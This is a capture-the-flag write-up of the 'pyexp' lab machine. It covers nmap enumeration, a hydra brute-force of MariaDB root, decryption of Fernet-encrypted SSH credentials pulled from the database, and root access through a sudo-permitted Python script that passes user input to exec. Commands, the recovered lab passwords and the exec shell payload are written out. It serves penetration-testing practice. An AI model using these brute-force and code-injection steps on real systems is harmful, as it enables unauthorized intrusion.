# ENUMERATION

Lets start with nmap
```
PORT     STATE SERVICE VERSION
1337/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 f7:af:6c:d1:26:94:dc:e5:1a:22:1a:64:4e:1c:34:a9 (RSA)
|   256 46:d2:8d:bd:2f:9e:af:ce:e2:45:5c:a6:12:c0:d9:19 (ECDSA)
|_  256 8d:11:ed:ff:7d:c5:a7:24:99:22:7f:ce:29:88:b2:4a (ED25519)
3306/tcp open  mysql   MySQL 5.5.5-10.3.23-MariaDB-0+deb10u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.23-MariaDB-0+deb10u1
|   Thread ID: 3021
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, LongColumnFlag, SupportsLoadDataLocal, IgnoreSigpipes, InteractiveClient, IgnoreSpaceBeforeParenthesis, SupportsTransactions, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, SupportsCompression, ODBCClient, ConnectWithDatabase, FoundRows, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: >o6^UpV;ccEo~MGXg|[1
|_  Auth Plugin Name: mysql_native_password
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Looking at the results, we have only port 1337, which was running *ssh* and port 3306 running MySQL. It was a quite bit strange as box didnt have any webserver running.

## PORT 3306
Lets start enumerating MySQL service. We can connect to public exposed mysql port using `mysql -h <ip> -u <user> -p`. As we dont have any credentials to work with, first thing we could try some combinations of common usernames and passwords, but none of the default
credentials worked. Next thing we can do is brute-forcing.

We can brute-force the service using hydra. We began with brute-forcing into the port with the username 'root' and 'rockyou.txt' as wordlist.
```bash
└──╼ $hydra -l root -P rockyou.txt <Target-IP> mysql
..[snip]...
[3306][mysql] host: 192.168.1.88   login: root   password: prettywoman
```
Now we have mysql credentials which we can use to login
```mysql
MariaDB [data]> show tables;
+----------------+
| Tables_in_data |
+----------------+
| fernet         |
+----------------+
```
In the `data` database, we have a table named `fernet`. Dumping the data of the table,
```
MariaDB [data]> select * from fernet;
+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+
| cred                                                                                                                     | keyy                                         |
+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+
| gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys= | UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0= |
+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+
1 row in set (0.398 sec)
```
The table contained a column named `cred` and `key`. Looking at the output, it seems to be encrypted. Also noticing the name of the table *Fernet*, it is a encryption method.
Googling methods to decrypt the data, we found a [site](https://asecuritysite.com/encryption/ferdecode). Using the Key and Cred, we got our decrypted data
```
lucy:wJ9`"Lemdv9[FEw-
```
The decrypted data seems like ssh credentials.

## Shell as Lucy
Using the credentials, we were in
```
lucy@pyexp:~$ id
uid=1000(lucy) gid=1000(lucy) groups=1000(lucy),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```
Checking for user's privileges
```
Matching Defaults entries for lucy on pyexp:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lucy may run the following commands on pyexp:
  (root) NOPASSWD: /usr/bin/python2 /opt/exp.py
```
The user *Lucy* was allowed to run the python script `/opt/exp.py` as root. As the file was owned by root and only readable by us, we can't make any changes to it.
Checking the content of file,
```python
uinput = raw_input('how are you?')                                                                                                                                       
exec(uinput)
```
The script was simple, it was taking user input and passing it directly to `exec` function.
> Exec function can dynamically execute code of python programs. The code can be passed in as string or object code to this function

We can run commands using this `exec` function, we can use it to give a root shell
```
lucy@pyexp:~$ sudo /usr/bin/python2 /opt/exp.py                                                                                                                          
how are you?import os;os.system("/bin/bash")                                                                                                                             
root@pyexp:/home/lucy# 
```
ROOT!!!
  
  
  
  
